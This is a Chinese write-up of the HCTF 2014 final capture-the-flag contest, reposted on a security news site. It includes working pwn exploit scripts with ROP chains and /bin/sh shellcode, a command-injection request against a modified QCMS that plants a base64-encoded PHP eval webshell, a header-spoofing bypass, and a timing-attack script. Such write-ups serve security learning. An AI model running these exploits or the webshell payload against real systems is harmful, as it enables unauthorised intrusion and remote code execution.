# 【全网首发】HCTF FINAL 2014 writeup完美通关攻略

阅读量 **177010**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2015-03-23 15:26:23

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

译文仅供参考，具体内容表达以及含义原文为准。

  

感谢白帽子@[D3AdCa7](http://weibo.com/n/D3AdCa7?from=feed&loc=at)的投稿，以下内容供安全爱好者参考学习，本文获得投稿奖励500元，即将打入作者账户，投稿请发送邮件至
huangyuan#360.cn。

HCTF线下决赛在前两天结束咯，首先附上最后的scoreboard：

狗我所在的233队最终以3525分拿下第一。

首先讲一下这次比赛的模式，分为5个route，除了第一个route外，每个route有个入口题目，做出一个入口题目之后才能向下进行。

第一个route是个pwn题，会每5分钟更新一个flag，一个flag价值15分。

第二个route的第一题是个逆向题（babycrack2），第二题是个奇怪的web题。

第三个route的第一题是个windows驱动题，第二题是个web题。

第四个route的第一题是个PPC题，内容是一个连连看。第二题是一个web题。

第五个route的第一题是个流量分析题，第二题是个web题。

其中队友搞定了pwn题，逆向题，PPC题和第二个route的第二个奇怪的web题，我搞定了流量分析题和余下的web题，分别拿下2225分和1300分。

******我是分割线******

按照题目来：

第一个route是个pwn题，qoobee，附上队友的一系列攻击代码。

bot.py

    
    
    #!/usr/bin/python
    import sys, requests, time, traceback
     
    def submit_flag(flag):
       data = {'userkey': flag}
       with open('session.txt','rt') as fp:
           cookie = fp.read().strip()
       r = requests.post('http://10.12.15.17/platform/check', data=data, headers={'Cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0'})
       msg = r.text[r.text.find("alert('")+7:r.text.find("')")]
       print 'Message:', msg
       return True if msg == 'NICELY DONE' else False
     
    from printf import *
     
    if __name__ == '__main__':
       ip, port = sys.argv[2], int(sys.argv[3])
       mod = sys.argv[1]
       while True:
           try:
              print 'Pwning target', ip, port
              for flag in pwn(ip, port):
                  if flag is None:
                     print 'Failed, retry now.'
                     continue
                  else:
                     print 'Gotta flag: ', flag
                     if submit_flag(flag):
                         print 'SCORED.'
                     else:
                         pass
                  time.sleep(5.0)
           except:
              print 'Exceptions in pwning thread: '
              traceback.print_exc()
              continue

danteng.py

    
    
    #!/usr/bin/python
    from zio import *
     
    def pwn(ip, port):
       io = zio((ip, port), timeout=100000, print_write=COLORED(REPR))#, print_read=None, print_write=None)
       #io = zio('./qoobee3')
       shellcode = "x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
       io.read_until('Your Choice')
       io.writeline('-214')
       io.writeline('hehehe')
       io.read_until('Your Choice')
       io.writeline('1')
       io.read_until('Name:')
       io.writeline('LeoC')
       io.read_until('Age:')
       io.writeline('-2147483648')
       io.read_until(':')
       io.writeline('Fatty Qoobee Long')
     
       io.gdb_hint([])
       io.writeline('5')
     
       mmap = 0x8048730
       read = 0x8048660
       popret = 0x804994b
       skip7 = 0x8049945
     
       rop_chain = [
                     0x23330000,
                     popret,
                     0x80000000,
                     mmap,
                     skip7, 0x23330000, 0x1000, 0x7, 0x32, 0xFFFFFFFF, 0x0,
                     0, # padding
                     read, 0x23330000, 0, 0x23330000, len(shellcode)
              ]
       for i in xrange(18,18+len(rop_chain)):
           io.read_until('Which one')
           io.writeline('%d' % i)
           io.read_until('How long')
           t = rop_chain[i-18]
           if t > 2147483647:
              t -= 0x100000000
           io.writeline(str(t))
       io.read_until('Which one')
       io.writeline('99')
     
       io.read_until('Total Money')
       io.writeline(shellcode)
       io.writeline('echo --Lchan--')
       io.writeline('cat /home/qoobee/flag')
       io.read_until('--Lchan--')
       io.readline()
       flag = io.readline()
       if len(flag) == 0: return None
       return flag
     
    if __name__ == '__main__':
       print 'Flag: ', pwn('10.11.12.13',1415)

description.py

    
    
    #!/usr/bin/python
    from zio import *
     
    def pwn(ip, port):
       io = zio((ip, port), timeout=100000, print_write=COLORED(REPR))#, print_read=None, print_write=None)
       #io = zio('./qoobee3')
       shellcode = "x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
       io.read_until('Your Choice')
       io.writeline('-214')
       io.read_until('real')
       io.writeline('hehehe')
       io.read_until('Your Choice')
       io.writeline('1')
       io.read_until('Name:')
       io.writeline('loli')
       io.read_until('Age:')
       io.writeline('10080')
       io.read_until(':')
       io.writeline('%11$08x')
     
       io.read_until('Your Choice')
       io.writeline('2')
       io.read_until('Description: ')
       canary = int(io.readline(),16)
       print 'Leaked stack canary:', hex(canary)
     
       io.gdb_hint([])
       io.read_until('Your Choice')
       io.writeline('1')
       io.read_until('Name:')
       io.writeline('loli')
       io.read_until('Age:')
       io.writeline('10080')
       io.read_until('Description')
       
       mmap = 0x8048730
       read = 0x8048660
       popret = 0x80498a6
       skip7 = 0x8049885
       main = 0x80488DB
     
       rop_chain = [
                     mmap,
                     skip7, 0x23330000, 0x1000, 0x7, 0x32, 0xFFFFFFFF, 0x0,
                     0,
                     main
    #                read, 0x23330000, 0, 0x23330000, len(shellcode)
              ]
       rop = ''
       for x in rop_chain:
           rop += l32(x)
       print 'ROP chain length: ', len(rop)
     
       payload = 'R' * 30 + l32(canary) + l32(0) + l32(0) + l32(0xeebbeebb) + rop
       io.writeline(payload)
     
       io.read_until('Your Choice')
       io.writeline('1')
       io.read_until('Name:')
       io.writeline('loli')
       io.read_until('Age:')
       io.writeline('10080')
       io.read_until('Description')
     
       rop_chain = [
                     read, 0x23330000, 0, 0x23330000, len(shellcode)
                  ]
       rop = ''
       for x in rop_chain:
           rop += l32(x)
       print 'Stage 2 chain length: ', len(rop)
       payload = 'R' * 30 + l32(canary) + l32(0) + l32(0) + l32(0xeebbeebb) + rop
       io.writeline(payload)
     
       io.writeline(shellcode)
     
       while True:
           io.writeline('echo --Lchan--')
           io.writeline('cat /home/qoobee/flag')
           io.read_until('--Lchan--')
           io.readline()
           flag = io.readline()
           if len(flag) == 0: yield None
           else: yield flag
     
    if __name__ == '__main__':
       print 'Flag: ', pwn('10.11.12.13',1415)

naive.py

    
    
    #!/usr/bin/python
    from zio import *
     
    def pwn(ip, port):
       io = zio((ip, port), timeout=4)#, print_read=None, print_write=None)
       io.writeline('-214')
       shellcode = 'PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQkyHwhah0vk0QaxtoDorSCX1xDobB59rNlIXcHMOpAA'
       io.writeline(shellcode + 'ymkelwin')
       io.writeline('echo --Lchan--')
       io.writeline('cat /home/qoobee/flag')
       io.read_until('--Lchan--')
       io.readline()
       flag = io.readline()
       return flag
     
    if __name__ == '__main__':
       print 'Flag: ', pwn('10.11.12.13',1415)
       
     
    navier.py
    #!/usr/bin/python
    from zio import *
     
    def pwn(ip, port):
       io = zio((ip, port), timeout=4, print_write=COLORED(REPR))#, print_read=None, print_write=None)
       io.read_until('Your Choice')
       io.writeline('-214')
       shellcode = "x4ax4ax4ax4ax4ax4ax4ax4ax4ax4ax4ax4ax4ax4a" + "x4ax4ax4ax37x52x59x6ax41x58x50x30x41x30x41" + "x6bx41x41x51x32x41x42x32x42x42x30x42x42x41" +    "x42x58x50x38x41x42x75x4ax49x74x71x79x59x68" +    "x77x78x61x58x30x34x4bx43x61x33x58x46x4fx34" +    "x6fx61x63x71x78x33x58x46x4fx73x52x35x39x30" +    "x6ex6ex69x4bx53x5ax6dx4fx70x41x41"
       io.writeline(shellcode + 'ymkelwin')
       io.gdb_hint([])
       io.read_until('Your Choice')
       io.writeline('1')
       calledx = 0x080488D0
       io.read_until('Name:')
       io.writeline('R' * 0x40 + l32(calledx))
       io.read_until('Age:')
       io.writeline('-2147483648')
     
       io.writeline('echo --Lchan--')
       io.writeline('cat /home/qoobee/flag')
       io.read_until('--Lchan--')
       io.readline()
       flag = io.readline()
       return flag
     
    if __name__ == '__main__':
       print 'Flag: ', pwn('10.11.12.13',1415)

然后是route2的第一题，逆向babycrack2。

简单逆向后可以看出，程序对输入的flag先做了如下验证：

1\. 要求strlen为19，恰有三位是数字。

2\. 要求`flag[17] > 0x20 && flag[17] < 0x30`

3\. ((0x9C ^ flag[7]) + 85) % 256 == 82

由第三条我们可以立刻得到:

`flag[7] = (((82 – 85) & 0xFF) ^ 0x9C)`

接下来的逻辑类似

“` c++

    
    
    int wtf(char *src, char *tar, char *key1)
     
    {
     
      const char* key2 = "dongdongqiang";
     
      for(int i = 0; i < 20; ++i)
     
      {
     
        src[i] ^= key1[i % 8];
     
        src[i] -= key2[i % 13];
     
      }
     
      for(int j = 0; j < 20; ++j)
     
      {
     
        if (src[j] != tar[j]) exit(0);
     
      }
     
      return 0;
     
    }

“`

其中key1为`flag[8:16]`，src及tar为程序中的常量，于是我们可以得到`flag[8:16]`。

接下来，程序执行了以下逻辑将程序中的一段内容解密：

“` c++

    
    
    int decrypt_something(char *content, char *flag)
     
    {
     
      for(int i = 0; i < 166; ++i)
     
      {
     
        if(i % 2)
     
          content[i] += 5;
     
        else
     
          content[i] -= 5;
     
      }
     
      for(int i = 165; i > 0; --i)
     
        content[i] ^= content[i - 1];
     
      for(int i = 0; i < 166; ++i)
     
      {
     
        if(i % 2 && i % 5)
     
        {
     
          if(i % 3)
     
            content[i] ^= flag[16];
     
          else
     
            content[i] -= flag[17];
     
        }
     
        else
     
        {
     
          content[i] += flag[16];
     
        }
     
      }
     
      return 0;
     
    }

“`

注意到第一部分计算与flag无关，我们观察第一部分解密之后的数据：

“`

    
    
    0000000: e520 9825 9f95 956b 9d21 4ef8 112e 9c75  . .%...k.!N....u
     
    0000010: 7e5d d26b 9521 776b 9595 9921 956b fd0e  ~].k.!wk...!.k..
     
    0000020: fd86 787a 776e d79e 1246 876b ddc0 9dd0  ..xzwn...F.k....
     
    0000030: 7c8c 3c49 7d43 adaf bc47 eaad 5072 7b86  |.<I}C...G..Pr{.
     
    0000040: abfc adcc bda1 f921 1f41 aaa1 a29f a166  .......!.A.....f
     
    0000050: 8a2d 229e c161 d663 9f8f 6e28 3b34 96e5  .-"..a.c..n(;4..
     
    0000060: e06a 972b 9561 956b 959d 95d2 2817 da28  .j.+.a.k....(..(
     
    0000070: 7582 cbd2 9521 9589 956b 9525 9595 956b  u....!...k.%...k
     
    0000080: 9521 956b 954b 9595 956b 956b 9589 fa03  .!.k.K...k.k....
     
    0000090: fae5 e026 9b6b 956b 9522 9596 9559 9521  ...&.k.k."...Y.!
     
    00000a0: 9534 956b 9595                           .4.k..

“`

偶数位置上及以5结尾的位置上的解密方式是`+=
flag[16]`，否则的话，[有情怀的位置](http://www.zhihu.com/question/26292516)上解密方式是`-=
flag[17]`，其他位置上为`^= flag[16]`。

注意到现在数据中有许多连续的0x95中间夹杂0x6B，我们可以做出一个合理的假设：这一段在加密前的数据中是连续的相同字符，利用这一点和加密方式的不同，可以得到

“` python

    
    
    >>> for o in xrange(256):
     
    ...     for b in xrange(256):
     
    ...             if 0x6b ^ b == o and ((0x95+b)&255) == o:
     
    ...                     print o,b
     
    ...
     
    0 107
     
    4 111
     
    16 123
     
    20 127
     
    128 235
     
    132 239
     
    144 251
     
    148 255

“`

x7f不太可能是flag中的字符，而4和16作为出现频率最高的字符则不太合理，因此我们得到flag[16] == chr(107) == 'k'

而flag[17]的范围十分有限，暴力之，将输出的文件交给`file`：

“`

r_____@NyanL:~/ctf/hctf-final$ file bin*

bin_21.zip: Zip archive data, at least v1.0 to extract

bin_22.zip: data

bin_23.zip: data

bin_24.zip: data

bin_25.zip: data

bin_26.zip: data

bin_27.zip: data

bin_28.zip: data

bin_29.zip: data

bin_2A.zip: data

bin_2B.zip: data

bin_2C.zip: data

bin_2D.zip: data

bin_2E.zip: data

bin_2F.zip: data

“`

只有0x21有意义。

于是我们得到了flag内容为为`hctf{??a_y*c7%etk!}`，`??`为不能确定的部分，不过由flag中一共有3位数字，可以知道这两位一定是数字，一共只有100种可能，直接暴力提交：

“`python

    
    
    #!/usr/bin/python
     
    import requests
     
    import bot
     
     
     
    flag = 'hctf{??a_y*c7%etk!}'
     
    for i in xrange(100):
     
            tf = flag.replace('??','%02d' % i)
     
            print 'Try ', tf, '....'
     
            if bot.submit_flag(tf):
     
                    print 'nm is %02d' % i
     
                    break

“`

（我没记错的话最终flag里的`??`部分是13）

第二个route的第二题，一个考察HTTP header的web题。

队友对其的描述是：“鬼知道是啥的web”，简直233

访问一下提示什么不能从remote host access，于是X-Forwarded-For，X-Real-Ip，Client-Ip挨个砸上去，提交X-Real-Ip: 127.0.0.1的时候莫名其妙返回了一个flag。

（第一天还交不了，第二天就能交了，不知道为什么。）

第三个route的第一题是个驱动题，觉得会蛋疼直接没看，第三个route的第二题是个web，当时我没搞定。赛后问了一下据说是个post注入，直接sqlmap就可以orz。

第四个route的第一题是个连连看，需要写代码解决。

人  
肉交互一小会儿可以大概猜出这是一个连连看，人肉玩过之后可以发现是正常规则的连连看，考虑每次把能消的消一步，消不动的情况和正常的连连看一样会自行  
reshuffle，不需要一次消干净（事实上服务器经常会生成出不存在能不reshuffle就一口气消完的解的局面）。

交互脚本

“` python

    
    
    #!/usr/bin/python
     
    from zio import *
    import os,sys
     
    io = zio(('10.11.12.13',6666), timeout=100000)
     
    while True:
            io.read_until('ROUND ')
            io.readline()
            print 'New round..'
            while True:
                    state = ''
                    rows = 0
                    cols = 0
                    win = False
                    while True:
                            t = io.readline()
                            if t.find('INPUT') != -1: break
                            if t.find('WIN') != -1:
                                    win = True
                                    break
                            state += t
                            cols = len(t.split('t'))
                            rows += 1
                    if win:
                            print 'WON!'
                            break
                    print 'We have a %d x %d puzzle.' % (rows,cols)
                    state = '%d %dn' % (rows, cols) + state
                    with open('link.in','wt') as fp:
                            fp.write(state)
                    print repr(state)
                    print 'Running solver...'
                    os.system('./link_solver < link.in > link.out')
                    with open('link.out','rt') as fp:
                            moves = fp.read().strip().split('n')
                    fst = True
                    for x in moves:
                            if not fst:
                                    io.read_until('INPUT')
                                    io.readline()
                            fst = False
                            io.writeline(x)

“`

这个Solver写麻烦了，不需要dfs的，一开始以为需要一组能一口气彻底消完的解于是写成了这样，后来也没改，就直接把dfs废掉完事…

“` c++

    
    
    #include <bits/stdc++.h>
     
    using namespace std;
     
    typedef long long ll;
    typedef pair<int,int> pii;
    typedef pair<pii,pii> piiii;
     
    #define encode(x,y,d,t) ((x) * 24 * 24 * 24 + (y) * 24 * 24 + (d) * 24 + (t))
     
    int mat[111][111];
    vector<piiii> solution;
    vector<piiii> cur_sol;
    int n = 0;
    int m = 0;
     
    const int dx[] = {0,0,1,-1};
    const int dy[] = {1,-1,0,0};
    bool vis[44][44][5][4];
    bool have_route(int x1,int y1,int x2,int y2)
    {
            if(x1 == x2 && y1 == y2) return false;
            memset(vis,0,sizeof(vis));
     
            queue<int> q;
            q.push(encode(x1,y1,4,0));
            vis[x1][y1][4][0] = true;
            while(!q.empty())
            {
                    int state = q.front(); q.pop();
                    int t = state % 24; state /= 24;
                    int d = state % 24; state /= 24;
                    int y = state % 24; state /= 24;
                    int x = state % 24;
     
                    for(int i = 0;i < 4;i++)
                    {
                            int nx = x + dx[i];
                            int ny = y + dy[i];
                            if(nx < 0 || nx > n+1 || ny < 0 || ny > m+1) continue;
                            int nt = t + (d != i);
                            if(d == 4) nt = t;
                            if(nt > 2) continue;
                            if(nx == x2 && ny == y2)
                            {
                                    return true;
                            }
                            if(!vis[nx][ny][i][nt] && mat[nx][ny] == 0)
                            {
                                    vis[nx][ny][i][nt] = true;
                                    q.push(encode(nx,ny,i,nt));
                                    //printf("%d %d %d %d -> %d %d %d %dn",x,y,d,t,nx,ny,i,nt);
                            }
                    }
            }
            return false;
    }
     
    int dfs(int depth)
    {
            if(depth == /*n * m / 2*/1) { solution = cur_sol; return 1; }
            for(int x1 = 1;x1 <= n;x1++)
            {
                    for(int y1 = 1;y1 <= m;y1++)
                    {
                            if(mat[x1][y1] == 0) continue;
                            for(int x2 = 1;x2 <= n;x2++)
                            {
                                    for(int y2 = 1;y2 <= m;y2++)
                                    {
                                            if(mat[x2][y2] == 0) continue;
                                            if(mat[x2][y2] != mat[x1][y1]) continue;
                                            if(!have_route(x1,y1,x2,y2)) continue;
                                            cur_sol.push_back(piiii(pii(x1,y1),pii(x2,y2)));
                                            int tmp = mat[x1][y1];
                                            mat[x1][y1] = mat[x2][y2] = 0;
                                            if(dfs(depth+1)) return 1;
                                            mat[x1][y1] = mat[x2][y2] = tmp;
                                            cur_sol.pop_back();
                                    }
                            }
                    }
            }
            return 0;
    }
     
    int main(void)
    {
            scanf("%d %d",&n,&m);
            for(int i = 1;i <= n;i++) for(int j = 1;j <= m;j++) scanf("%d",&mat[i][j]);
     
            dfs(0);
     
            if(solution.size() == 0) puts("No solution, shit happened.");
            else
            {
                    for(auto x: solution)
                            printf("%d %d %d %dn",x.first.first,x.first.second,x.second.first,x.second.second);
            }
            while(getchar() != EOF);
            return 0;
    }

“`

第四个route的第二题是个web源代码审计题，主办方放出了一个QCMS，后来告知根目录有个hctf.zip文件，里面有[home.php.bak](http://home.php.bak)文件，于是下载了原版的QCMS
V2.0代码来diff了一下。

可以看出代码做了一些改动，也可以找到网上有人爆出QCMS的命令执行漏洞（可是那个漏洞好像没办法利用的样子，如果有大神搞出POC的话求赐教），于是主办修改了一些地方。

关键的修改点在于$size =
(int)$height;这里，导致了在width那个位置可以输入任意东西且不被过滤，于是开始构造命令注入，最终成功的POC如下：

GET

/index_1'`echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbYWRvZ2dvZGFdKTs/Pg==${IFS}|base64${IFS}-d${IFS}>helloworld/adog.php`'1_11_aa/.php  
HTTP/1.1

Host: 10.12.13.89

Proxy-Connection: keep-alive

Cache-Control: max-age=0

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

User-Agent:  
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36  
(KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36

Accept-Encoding: gzip, deflate, sdch

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4

Cookie: PHPSESSID=l37h70e8t813r6qbprgp0kfn27

（robots.txt中有提示helloworld这个权限为777的目录）

于是在网站根目录的helloworld文件夹中写入了一句话木马，接着连上去，在网站根目录和数据库分别发现一枚flag：

顺便附上这道题目作者的blog（http://www.nohackair.net/176.shit），我的做法和他预设的做法不一样，他原来预设的做法显然更加高大上一些～

接下来是route5的第一题，是个pcap流量分析。

大  
家首先一通乱搞，把题目作者的acfun账号拿了下来（显然作者不小心留了未过期的cookie在里面），胡乱翻了一通没发现什么信息，于是继续看。使用  
filter为tcp contains “.rar”搜出一条奇怪流量，把rar还原出来。里面有一个图片和一个doc文件，图片如下：

上面有信息key：XPA087T24433PASS

但用这个怎么提交都不对，图片也分析不出什么。后来主办方放出hint，说doc后面有密文。

于  
是ultraedit打开doc，对比着正常的doc文件把末尾的密文扒拉出来，因为key是16位长的字符串，也就是128bit，猜测可能是AES等  
用128bit密钥的加密算法。搞了半天没结果，后来主办有提示这是DES加密，可DES如何使用128bit的密钥，你在逗我？

结果在胡搞的过程中随手尝试了用XPA087T2当作密钥来解密密文，把解密出的东西print出来一看，PDF magic header！看来就是他了。

然后看PDF，怎么也找不出东西，随手command＋F搜索，结果如下：

显然主办方藏了base64，复制出来解密，得到flag，First blood。

第五个route的第二题，web小trick集锦，首先wget首页，然后xdd看一下，发现tab和空格有猫腻。

然后用python胡搞一下：

接下来去下载nizaizhaoshenme，发现是个png图片，丢给[http://utilitymill.com/utility/Steganography_Decode](http://utilitymill.com/utility/Steganography_Decode)，可以获得flag，或者本地用stepic也可以。

接  
下来会发现一个网站，登录之后可以执行命令，但是个硬编码的，各种fuzz无果，后来发现页面注释有提示flag.php?ue=flag，而  
flag.php的内容是个unixtime，这次比赛的flag都是hctf{开头的，于是测试flag.php?ue=hctf{，页面产生明显延  
迟，于是猜测是时序攻击，附上脚本。

    
    
    import string
    import time
    import requests
     
    ans = 'hctf{9(xD@i}'
     
    # buf = string.ascii_letters + string.digits
    # buf = string.ascii_letters + string.digits
     
    for i in xrange(20):
        # for tmp in range(33,127):
        for tmp in range(ord('1'),127):
            tmp = chr(tmp)
            a = time.time()
            r = requests.get('http://10.12.14.51/24lejfo9aldk/flag.php?ue=' + ans + tmp)
            b = time.time()
            print '----'
            print 'Testing: ' + tmp
            print '----'
            if b - a - len(ans) > 1.0:
                ans += tmp
                print 'Found!'
                print 'Now the flag is: ' + ans
                break
            else:
                print 'Failed at ' + tmp + '...'
                print 'Now the flag is: ' + ans
                continue
     
     
    # a = time.time()
    # r = requests.get('http://10.12.14.51/24lejfo9aldk/flag.php?ue=')
    # b = time.time()
    # print b-a

最后拿下flag，接下来是个安卓kernel的题目，时间也不够了，于是就放弃咯。

欢迎交流扯淡：

weibo：weibo.com/d34dc47

blog：gou.gg

email：deadcat6464[at]gmail.com

其他wirteup：[HCTF-Writeup-by-Pax.Mac-Team](http://conqu3r.paxmac.org/wp-content/uploads/HCTF-Writeup-by-Pax.Mac-Team%E5%9B%A2%E9%98%9F.pdf)

本文翻译自360安全播报 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/82320](/post/id/82320)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF通关攻略](/tag/CTF通关攻略)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

